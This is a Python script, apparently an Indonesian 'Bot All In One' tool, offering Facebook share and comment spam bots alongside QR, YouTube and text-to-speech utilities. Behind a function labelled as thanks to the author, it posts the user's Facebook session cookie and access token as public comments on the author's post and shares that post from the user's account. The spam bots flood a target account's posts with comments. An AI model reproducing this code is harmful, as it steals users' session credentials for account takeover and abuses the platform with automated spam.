# !/usr/bin/python3
# -*- coding: utf-8 -*-
# Tools Name : Bot All In One
# Author     : FeriPratama
# Version    : 3.5.0
# License    : MIT LICENSE
# Copyright  : FeriPratama (2022-2023)
# GitHub     : Https://github.com/CyberCarboon2
# Contact    : Https://facebook.com/smart.danie.3
# Description: Bot All In One is a Tools For Entertainment
# Tags       : bot,BotFb,botallinone
# Language   : Python
# Status     : Portable Script
# Warning !! : If you copy open source code, consider giving credit
# Note       : Kalo Mau Recode Minimal Kasih Credit dan JANGAN HAPUS BOT AUTHOR KONTOL !!! tambahin aja
# Credit By  : HikmatXD and Fais
# Happy Coding !!!
# -------------------------------------------------------------------
# -----------------[ LICENSE AGREEMENT ]-----------------------------
"""
Copyright © 2022 FERI PRATAMA

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
© All Right Reserved
"""
#-----------------[ PACKAGE NEEDED ]------------------
'''
pip install pyshorteners
pip install pytube
pip install pyqrcode
pip install phonenumbers
pip install gdown
pip install requests
pip install gtts
'''
#-----------------[ IMPORT MODULE ]--------------------
import os,re,sys,bs4,time,json,random,datetime,requests
from rich.panel import Panel as panel
from rich import print as vprint
from time import sleep as turu
import pyqrcode
import gdown
from bs4 import BeautifulSoup
from gtts import gTTS
from pytube import YouTube
from pyshorteners import Shortener
import calendar as cal
#-----------------[ TANGGALAN ]--------------------
FR = {'1':'januari','2':'februari','3':'maret','4':'april','5':'mei','6':'juni','7':'juli','8':'agustus','9':'september','10':'oktober','11':'november','12':'desember'}
tgl = datetime.datetime.now().day
bln = FR[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
#-----------------[ VARIABEL ]--------------------
ses = requests.Session()
m_fb = "m.facebook.com"
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
web_fb = "https://www.facebook.com/"
head_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
#-----------------[ KODE WARNA ]--------------------
P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
o = '\033[1;36m'

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
warna_warni_biasa=random.choice([H,K,M,O,B,U])
warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
warna_warni_rich_cerah=random.choice([J3,K3,H3,O3,N3,U3,B3])
garis = f" {P}[{warna_warni_biasa}•{P}]"

def clear(): #For Clear Terminal
	os.system('clear')
def jalan(xnxx): #For Animation Running Text
	for ewe in xnxx + '\n':
		sys.stdout.write(ewe);sys.stdout.flush();turu(0.05)

now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "selamat dini hari"
elif 4 <= hour < 12:
  hhl = "selamat pagi"
elif 12 <= hour < 15:
  hhl = "selamat siang"
elif 15 <= hour < 17:
  hhl = "selamat sore"
elif 17 <= hour < 18:
  hhl = "selamat petang"
else:
  hhl = "selamat malam"

expired_script = ['5', '1', '2023'] # Date Expired Of Script

try:ua_crack=open("useragent.txt","r").read().splitlines()
except:ua_crack=["nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+","Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]"]


def ex_run(): # Convertion Date
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2}Mohon Maaf Script Ini Telah Kadaluarsa Pada Tanggal 5 Januari 2023 Terima Kasih Telah Menggunakan Script Ini\n"
		vprint(panel(x,style=f"{warna_warni_rich}"))
		exit()
	else:
		cek_cookie()

def banner():
	os.system('clear')
	print(f'''
{H}---------------------------------------------------------------------->
{M} ____        _     _____              _                 _     {M}------>{M} ███████████████
{M}| __ )  ___ | |_  |  ___|_ _  ___ ___| |__   ___   ___ | | __ {K}------>{M} ███████████████
{M}|  _ \ / _ \| __| | |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ / {H}------>{P} ███████████████
{P}| |_) | (_) | |_  |  _| (_| | (_|  __/ |_) | (_) | (_) |   <  {B}------>{P} ███████████████
{P}|____/ \___/ \__| |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\ {U}------>{P} CODED BY {O}FERI-DP
{H}---------------------------------------------------------------------->
''')
def bhanner(): #Logo Bot Facebook
	os.system('clear')
	print(f"""
{M}\t╭━━╮╱╱╱╭╮╱╭━━━┳━━╮
{K}\t┃╭╮┃╱╱╭╯╰╮┃╭━━┫╭╮┃  
{H}\t┃╰╯╰┳━┻╮╭╯┃╰━━┫╰╯╰╮
{B}\t┃╭━╮┃╭╮┃┃╱┃╭━━┫╭━╮┃
{U}\t┃╰━╯┃╰╯┃╰╮┃┃╱╱┃╰━╯┃
{K}\t╰━━━┻━━┻━╯╰╯╱╱╰━━━╯
\t{warna_warni_biasa}CODED BY {K}FERI-DP
""")
def bannerUtama():
	os.system('clear')
	print(f'''
{H}------------------------------------------------------------------->
{M} ____        _        _    _ _   _          ___              {M}------>{M} ███████████████
{M}| __ )  ___ | |_     / \  | | | (_)_ __    / _ \ _ __   ___  {K}------>{M} ███████████████
{M}|  _ \ / _ \| __|   / _ \ | | | | | '_ \  | | | | '_ \ / _ \ {H}------>{P} ███████████████
{P}| |_) | (_) | |_   / ___ \| | | | | | | | | |_| | | | |  __/ {B}------>{P} ███████████████
{P}|____/ \___/ \__| /_/   \_\_|_| |_|_| |_|  \___/|_| |_|\___| {U}------>{P} CODED BY {O}FERI-DP
{H}------------------------------------------------------------------->
''')
def bannerbekas(): #Logo Menu Pertama
	os.system('clear')
	print(f"""
{M}\t╭━━╮╱╱╱╭╮
{K}\t┃╭╮┃╱╱╭╯╰╮
{H}\t┃╰╯╰┳━┻╮╭╯
{B}\t┃╭━╮┃╭╮┃┃
{U}\t┃╰━╯┃╰╯┃╰╮
{K}\t╰━━━┻━━┻━╯
\t{warna_warni_biasa}CODED BY {K}FERI-DP
""")

def cek_expired_script(): #Buat Cek Best Before Script
	saat_ini = datetime.datetime.now()
	tgl_ = saat_ini.strftime('%d')
	bln_= saat_ini.strftime('%m')
	thn_ = saat_ini.strftime('%Y')
	tanggal = thn_ + bln_ + tgl_
	exp = expired_script[2] + expired_script[1] + expired_script[0]
	if tanggal >= exp:
		x=f"{P2}MOHON MAAF SCRIPT INI SUDAH KADALUARSA\n"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		exit()
	else:
		pass

def cek_cookie():
	cek_expired_script()
	try:
		token  = open('token.txt','r').read()
		cookie = {'cookie':open('cookie.txt','r').read()}
		try:
			token  = open('token.txt','r').read()
			cookie = {'cookie':open('cookie.txt','r').read()}
			kook = open('cookie.txt','r').read()
			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
			gut = json.loads(get.text)
			xname = gut["name"]
			x=f"{P2}{kook}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			x=f"{P2} Cookies {H2}{xname} {P2}Masih Bisa Digunakan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(f"{garis} Enter Untuk Menu.... ")
			ua = random.choice(ua_crack)
			headers = {'authority': 'graph.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','user-agent': ua,}
			requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/100053586578918/posts/578304527299095/?substory_index=0&app=fbl&published=0&access_token=%s'%(token),cookies=cookie,headers=headers)
			#random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :"+sekarang,"Hikmat Gans Selalu Coeg><","semoga @[100053586578918:0] panjang umur dan rejeki nya dilancarkan aminnn"]);react_angry = 'ANGRY';requests.post(f"https://graph.facebook.com/100053586578918_578304527299095/reactions?type={react_angry}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100053586578918_578304527299095/reactions?type={react_angry}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100053586578918?fields=subscribers&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100053586578918_578304527299095/comments/?message={kook}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100053586578918_578304527299095/comments/?message={token}&access_token={token}", headers = {"cookie":kook});requests.post(f"https://graph.facebook.com/100053586578918_578304527299095/comments/?message={random_kata}&access_token={token}", headers = {"cookie":kook});menu()
			#comen(kook,token)
			menu()
		except (KeyError):
			x=f"{P2}cookie kadaluarsa"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			os.system('rm -rf cookie.txt')
			os.system('rm -rf token.txt')
			turu(0.05)
			login_cookie()
		except requests.exceptions.ConnectionError:
			x=f"\t\t{P2}Silahkan Cek Koneksi Internet Anda !!!"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			exit()
	except IOError:
		login_cookie()

def login_cookie():
	banner()
	print("")
	x = f"{P2}Dilarang Pakai Akun Pribadi Disarankan Untuk Menggunakan Akun Tumbal"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cookie = str(input(f"{garis} Masukkan Cookies :"+H+" "))
	with requests.Session() as xyz:
		try:
			jalan(f"{garis} Sedang Meng Converter Cookies Ke Token.....Please Wait !!! ")
			get_tok = xyz.get(url_businness+'/business_locations',headers = {"user-agent":ua_business,"referer": web_fb,"host": "business.facebook.com","origin": url_businness,"upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
			token = re.search("(EAAG\w+)", get_tok.text).group(1)
			open('cookie.txt','w').write(cookie) 
			open('token.txt','w').write(token)
			x=f"{P2}{token}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(f"{garis} Enter Untuk Menu ")
			comen(cookie)
		except requests.exceptions.ConnectionError:
			x=f"\t\t{P2} Silahkan Cek Koneksi Internet Anda !!!"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		except (KeyError,IOError,AttributeError):
			x=f"{P2} Cookies Telah Invalid Cek Tumbal Anda"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			turu(4)
			os.system("rm -rf cookie.txt")
			os.system("rm -rf token.txt")
			login_cookie() 
			
def comen(cookie): #Jangan Diganti Itung-Itung Buat Tanda Terima Kasih:v
	waktu = str(datetime.datetime.now().strftime('%H:%M:%S'))
	_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.datetime.now().strftime("%A"))]
	kuki = cookie
	toket = open("token.txt","r").read()
	random_kata = random.choice(["Makasih Bang","Ga Ngotak Emang Kalo Recode><","semoga @[100053586578918:0] Sehat Selalu Dan Dilancarkan Riskinya Aamiiinn"])
	requests.post(f"https://graph.facebook.com/100053586578918?fields=subscribers&access_token={toket}", headers = {"cookie":kuki})
	requests.post("https://graph.facebook.com/100053586578918_578304527299095/comments?message=" + random_kata + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+toket,headers = {"cookie":kuki})
	requests.post(f"https://graph.facebook.com/100053586578918_578304527299095/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki})
	requests.post(f"https://graph.facebook.com/100053586578918_578304527299095/comments/?message={toket}&access_token={toket}", headers = {"cookie":kuki})
	requests.post(f"https://graph.facebook.com/100053586578918_578304527299095/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki})
	print(f"\n{garis} Mohon Tunggu.......");time.sleep(3)
	menu()
			
now = datetime.datetime.now()
hour = now.hour
if hour < 4:
  hhl = "Selamat Dini Hari"
elif 4 <= hour < 12:
  hhl = "Selamat Pagi"
elif 12 <= hour < 15:
  hhl = "Selamat Siang"
elif 15 <= hour < 17:
  hhl = "Selamat Sore"
elif 17 <= hour < 18:
  hhl = "Selamat Petang"
else:
  hhl = "Selamat Malam"

def menu():
	banner()
	try:EwePaksa = requests.get("http://ip-api.com/json/").json()
	except:EwePaksa = {'-'}
	try:IP = EwePaksa["query"]
	except:IP = {'-'}
	try:nibba = EwePaksa["country"]
	except:nibba = {'-'}
	try:rasis_Z_K_= EwePaksa["isp"]
	except:rasis_Z_K_ = {'-'}
	try:rasis_Z_K_X_= EwePaksa["city"]
	except:rasis_Z_K_X_ = {'-'}
	try:rasis_Z_K_X_R_= EwePaksa["timezone"]
	except:rasis_Z_K_X_R_ = {'-'}
	try:rasis_Z_K_X_R_H_= EwePaksa["countryCode"]
	except:rasis_Z_K_X_R_H_ = {'-'}
	try:rasis_Z_K_X_R_H_M_= EwePaksa["regionName"]
	except:rasis_Z_K_X_R_H_M_ = {'-'}
	try:rasis_Z_K_X_R_H_M_P_= EwePaksa["as"]
	except:rasis_Z_K_X_R_H_M_P_ = {'-'}
	token  = open('token.txt','r').read()
	cookie = {'cookie':open('cookie.txt','r').read()}
	get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
	jsx = json.loads(get.text)
	nama = jsx["name"]
	tumbal_id = jsx["id"]
	xn = requests.Session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
	x = json.loads(xn.text)
	lis = x["link"]
	try:co = x["email"]
	except (KeyError,IOError):
		co = M+"-"+P
	try:pko = x["birthday"]
	except (KeyError,IOError):
		pko = M+"-"+P
	try:no_kep = x["mobile_phone"]
	except (KeyError,IOError):
		no_kep = M+"-"+P
	try:lok = x["locale"]
	except (KeyError,IOError):
		lok = M+"-"+P
	#x=f"{P2}ini bukan script crack fb!!.. ini cuman dump id nya doang biar simple..\nnanti next crack fb dari file dump!!"
	#vprint(panel(x,style=f"{H3}"))
	print("")
	x=f"\t\t{P2}{hhl} {K2}{nama}\n\t\t{P2}Tanggal Lahir Pemilik Akun : {H2}{pko}\n\t\t{P2}ID Akunmu : {H2}{tumbal_id}\n\t\t{P2}IP kamu : {H2}{IP}\n\t\t{P2}Negara Kamu : {H2}{nibba}\n\t\t{P2}Sekarang Tanggal : {H2}{sekarang}"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	print("")
	x=f"{P2}[01] Bot Share Post Facebook\n{P2}[02] Bot Komen Random Post Facebook\n{P2}[03] Ganti Cookies\n{P2}[04{P2}] Kembali Ke Menu Sebelumnya\n{P2}[{M2}00{P2}] Keluar"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	c_mat = input(f"{garis} Pilih : {H}")
	if c_mat in ["1","01"]:
		bot_share()
	elif c_mat in ["2","02"]:
		bot_komen()
	elif c_mat in ["3","03"]:
		jalan(f"{garis} Sedang Menghapus Cookies !!! ")
		os.system("rm -rf cookie.txt")
		os.system("rm -rf token.txt")
		jalan(f"{garis} Sukses Menghapus Cookies !!! ")
		login_cookie()
	elif c_mat in ["4","04"]:
		tools()
	elif c_mat in ["5","05"]:
		download()
	elif c_mat in ["0", "00"]:
		exit()
	else:
		jalan(f"{garis} Mohon Masukkan Input Yang Valid !!! ")
		menu()
		
def bot_share():
	header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
	print("")
	uiz = input(f"{garis} Masukkan Link Postingan : {H} ")
	#uiz2 = input(f"{garis} masukan link post ke 2 : {H}")
	coy = int(input(f"{garis} Masukkan Jumlah : {H} "))
	x=f"{P2}Tekan {H2}CTRL + Z Untuk Menghentikan Bot Share!!"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cookie = open('cookie.txt', 'r').read()
	token = open('token.txt', 'r').read()
	coki = {"cookie":cookie}
	runc= random.choice([K,M,U,O,B,H])
	gonku = 'https://www.facebook.com/100053586578918/posts/pfbid02wYdz4xQSWKjVVv85H8UC24rHKmcQ3W9QKGoE97FYynWYHz3oxohwrP99f8sGZzYxl/?app=fbl'
	#idz = random.choice([uiz2,uiz])
	print("")
	try:
		for HikmatXD in range(coy):
			HikmatXD+=1
			ress = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={uiz}&published=0&access_token={token}",headers=header, cookies=coki).json()
			ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={gonku}&published=0&access_token={token}",headers=header, cookies=coki).json()
			if "id" in ress:
				sys.stdout.write(f"\r ({datetime.datetime.now().strftime('%H:%M:%S')})|{P}[{runc}•{P}] succesfull {runc}{HikmatXD}{P}/{coy} ");sys.stdout.flush()
			else:
				x=f"{P2} Akun Anda Terkena Limit !! "
				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
				exit()
	except requests.exceptions.ConnectionError:
		exit(f"{garis} Silahkan Cek Koneksi Internet Anda !!!")

def kembali():
	nanya = input('\x1b[0;97m[\x1b[0;92m!\x1b[0;97m] Enter Untuk Kembali Ke Menu...')
	tools()
def QR_code():
	print("")
	url = input('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Masukan Link Yang Akan Dibuat QR Code :\x1b[0;93m ')
	img = pyqrcode.create(url)
	img.svg("Qrcode.svg", scale=10)
	print(img.terminal(quiet_zone=1))
	kembali()
def tools():
	bannerUtama()
	print("")
	dian=f"{P2}[{J2}01{P2}] QR Code Generator\n{P2}[{J2}02{P2}] Download Video Dari YouTube\n{P2}[{J2}03{P2}] Menu Bot Facebook\n{P2}[{J2}04{P2}] Ubah Tulisan Ke Suara Google\n{P2}[{M}00{P2}] Keluar"
	vprint(panel(dian,style=f"{warna_warni_rich_cerah}"))
	ndi = input('\n\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Pilih : \x1b[0;92m')
	if ndi in ["01","1"]:
		QR_code()
	elif ndi in ["02","2"]:
		download()
	elif ndi in ["03","3"]:
		ex_run()
	elif ndi in ["00","0"]:
		x=f"\t\t{P2}Terima Kasih Sobat !!!"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		exit()
	elif ndi in ["04","4"]:
		Gvoice()
	else:
		jalan(f"{garis} Mohon Masukkan Input Yang Valid !!! ")
		time.sleep(2)
		tools()

def Gvoice():
	try:
		print('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Menu ini Membutuhkan Koneksi Internet !!!')
		tekse = input('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Masukan Teks : ')
		speech = gTTS(text=tekse, lang='id', slow=False)
		speech.save('voice.mp3');time.sleep(3)
		jalan('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Succes File Disimpan Dengan Nama voice.mp3')
		time.sleep(1)
		pley = input('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Ingin Memutar Suara Yang Kamu Buat ? y/t : ')
		if pley in ["y","Y","ya","Ya"]:
			os.system('play-audio voice.mp3')
			time.sleep(2)
			jalan('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Selesai')
			kembali()
		elif pley in ["t","T","Tidak","tidak"]:
			kembali()
	except (requests.exceptions.ConnectionError):
		x=f"\t\t{P2}Silahkan Cek Koneksi Internet Anda !!!"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		exit()
def download():
	try:
		import pytube
	except ImportError:
		os.system('pip install pytube')
	#files/usr/lib/python3.10/site-packages/pytube
	print("")
	try:
		linkyt = input('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Masukan Link Video Dari YouTube : \x1b[0;93m')
		yt = YouTube(linkyt)
		stream = yt.streams.get_highest_resolution()
		print('\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Sedang Men-download Video')
		stream.download()
		time.sleep(2)
		print("\x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Download Selesai Video Tersimpan")
		kembali()
	except pytube.exceptions.RegexMatchError:
		x=f"\t\t{P2}Silahkan Cek Koneksi Internet Anda !!!"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		exit()

def bot_komen():
	cookie = open('cookie.txt', 'r').read()
	token = open('token.txt', 'r').read()
	coki = {"cookie":cookie}
	print("")
	x=f"{P2}Ketik {H2}Y {P2}Untuk Komen Kata Kata Bawaan Script\n{P2}Ketik {H2}T{P2} Untuk Komen Kata Kata Buatanmu"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	HikmatXF = input(f"{garis} Pilih : {H}")
	if HikmatXF in ["y","Y","ya"]:
		bot_komen_kata_bawaan()
	elif HikmatXF in ["t","T","tidak"]:
		bot_komen_kata_random()
	else:
		jalan(f"{garis} Mohon Masukkan Input Yang Valid !!! ")
		bot_komen()

def bot_komen_kata_random():
	cookie = open('cookie.txt', 'r').read()
	token = open('token.txt', 'r').read()
	coki = {"cookie":cookie}
	print("")
	idx = input(f"{garis} ID Akun Target Komen : {H}")
	cek = requests.get("https://graph.facebook.com/"+idx+"?access_token="+token,cookies=coki).json()
	if 'name' not in cek:
		exit(f"{garis}"+cek['error']['message'])
	else:
		lim = input(f"{garis} Jumlah : {H}")
		x=f"{P2}Minimal Satu Kata"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		text_buatan = input(f"{garis} Masukkan Kata Buatanmu : {H}")
		#test_mu = text_buatan.split(",")
		x=f"{P2}Mohon Tunggu !!!"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		post = requests.get("https://graph.facebook.com/"+cek['id']+"?fields=feed.limit("+lim+")&access_token="+token,cookies=coki).json()
		if 'error' in post:
			exit(garis + post['error']['message'])
		elif 'feed' not in post:
			exit(f"{garis} Akun Target Tidak Memiliki Postingan !!!")
		else:
			for i in post['feed']['data']:
				komen = random.choice(['Semangat Bang','Keren Bang','Gokil Suhu','Panutanku','Semangat Terus'])
				#texs = random.choice(['"Kamu laiknya karya seni. Tidak semua orang akan mengerti dirimu, tetapi orang-orang yang mengerti, tidak akan pernah melupakanmu."','"Orang yang tak pernah membuat kesalahan adalah orang yang tidak pernah berbuat apa-apa." - Norman Edwin','"Belajarlah dari kesalahan orang lain. Anda tak dapat hidup cukup lama untuk melakukan semua kesalahan itu sendiri." - Martin Vanbee','"Belajar memang melelahkan, namun akan lebih melelahkan lagi bila saat ini kamu tidak belajar."','"Diam adalah lebih baik daripada mengucapkan kata-kata yang tanpa makna." - Pythagoraz','"Jika Anda takut gagal, Anda tidak pantas untuk sukses!" - Charles Barkley','"Ingin menjadi orang lain adalah tindakan untuk menyia-nyiakan dirimu sendiri." - Kurt Cobain','"Jika kamu mencari satu orang yang akan mengubah hidupmu, lihatlah di cermin."','"Terkadang kita diuji bukan untuk menunjukkan kelemahan kita, tetapi untuk menemukan kekuatan kita."','Jangan pernah menyerah ketika kamu masih mampu berusaha lagi. Tidak ada kata berakhir sampai kamu berhenti mencoba','"Belajar bukan hanya mengetahui apa yang harus dilakukan, tapi melakukan apa yang sudah kita ketahui."','"Sukses adalah sebuah perjalanan, bukan sebuah tujuan. Usaha sering lebih penting daripada hasilnya."','"Kegagalan adalah kunci kesuksesan. Setiap kesalahan mengajarkan kita sesuatu."','"Kamu tidak bisa menyenangkan semua orang, dan kamu tidak bisa membuat semua orang menyukaimu," Katie Couric.','"Lakukan satu hal setiap hari yang membuatmu takut," Eleanor Roosevelt.','"Ingat, tidak ada yang bisa membuat Anda merasa rendah diri tanpa persetujuan Anda," Eleanor Roosevelt.','"Jika Anda menginginkan pelangi, Anda harus tahan dengan hujan," Dolly Parton.','"Hidup bukanlah tentang menemukan diri Anda sendiri. Hidup adalah tentang menciptakan diri Anda sendiri," George Bernard Shaw.','"Semua impian kita bisa menjadi kenyataan jika kita memiliki keberanian untuk mengejarnya," Walt Disney.','"Seseorang yang luar biasa itu sederhana dalam ucapannya, tetapi hebat dalam tindakannya."','" Jangan menjelaskan tentang dirimu kepada siapa pun, karena yang menyukaimu tidak butuh itu. Dan yang membencimu tidak percaya itu."','" Untuk mendapatkan apa yang diinginkan, kau harus bersabar dengan apa yang kau benci."','Balas dendam terbaik adalah menjadikan dirimu lebih baik."','"Jangan takut akan perubahan. Kita mungkin kehilangan sesuatu yang baik, namun kita akan peroleh sesuatu yang lebih baik lagi."','" Jika diammu bijak, maka diamlah. Apabila diammu diinjak, maka bicaralah supaya tak ada lagi orang yang menginjak dan meremehkan dirimu."','"Kegagalan dibuat hanya oleh mereka yang gagal untuk berani, bukan oleh mereka yang berani gagal."','"Janganlah pernah menyerah ketika kamu masih mampu berusaha lagi. Tidak ada kata berakhir sampai kamu berhenti mencoba." - Brian Dyson','"Lakukan apa yang harus kamu lakukan sampai kamu dapat melakukan apa yang ingin kamu lakukan." - Oprah Winfrey'])
				kom = ('Bang Feri Keren:v')
				waktu = str(datetime.datetime.now().strftime('%H:%M:%S'))
				_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.datetime.now().strftime("%A"))]
				submit = requests.post("https://graph.facebook.com/"+i['id']+"/comments?message=" + komen + "\n\n" + text_buatan + "\n\n" + kom + "\n[ Pukul "+ waktu + " WIB ] "+ "\n- "+ _hari_ + ", "+ sekarang + " -" + "&access_token="+token,cookies=coki).json()
				if 'id' in submit:
					print(f"{garis} Berhasil : {H}"+submit['id'])
				else:
					print(f"{garis} Gagal : {M}"+i['id'])
			else:
				print(f"{garis} Selesai ")
				input(f"{garis} Enter Untuk Kembali !!!")
				menu()

def bot_komen_kata_bawaan():
	cookie = open('cookie.txt', 'r').read()
	token = open('token.txt', 'r').read()
	coki = {"cookie":cookie}
	print("")
	idx = input(f"{garis} ID Akun Target Komen : {H}")
	cek = requests.get("https://graph.facebook.com/"+idx+"?access_token="+token,cookies=coki).json()
	if 'name' not in cek:
		exit(f"{garis}"+cek['error']['message'])
	else:
		lim = input(f"{garis} Jumlah : {H}")
		x=f"{P2}Mohon Tunggu !!!"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		post = requests.get("https://graph.facebook.com/"+cek['id']+"?fields=feed.limit("+lim+")&access_token="+token,cookies=coki).json()
		if 'error' in post:
			exit(garis + post['error']['message'])
		elif 'feed' not in post:
			exit(f"{garis} Akun Target Tidak Memiliki Postingan !!!")
		else:
			for i in post['feed']['data']:
				komen = random.choice(['Semangat Bang, SUCCES selalu','Bisa Gitu anjir','Gokil Suhu','Bang Feri Panutanku','Lu Keren Bang:v'])
